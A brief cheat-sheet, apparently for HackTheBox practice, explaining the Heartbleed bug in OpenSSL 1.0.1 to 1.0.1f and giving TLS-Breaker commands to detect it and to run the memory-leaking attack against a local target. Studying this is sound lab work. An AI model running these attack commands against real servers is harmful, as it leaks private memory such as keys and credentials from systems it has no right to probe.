This is a specific attack that targets specifical versions of OpenSSL(**OpenSSL 1.0.1 to 1.0.1f**), specifically it parses wrongly the Heartbeat extension.

# How it works?
By default you can send small payloads to a Openssl to check if the connection is still alive or not, this extension is called Hearthbeat.
In some old and vulnerable OpenSSL servers(see at top) the backend would parse the payload wrong and get informations from it memory. Example if we would send somethign like **("HackTheBox", 1024)**
The server would save in memory "HackTheBox" but would return 1024 bytes worth of data.

# How to identify?
Install: https://github.com/tls-attacker/TLS-Breaker/tree/main
```
java -jar heartbleed-1.0.0.jar -connect 127.0.0.1:443
```
(If you get Vulnerable then you are GUCCI)

# Exploit
Install: https://github.com/tls-attacker/TLS-Breaker/tree/main
```
java -jar heartbleed-1.0.0.jar -connect 127.0.0.1:443 -executeAttack -heartbeats 10
```
(you might need to spin it several times for success)
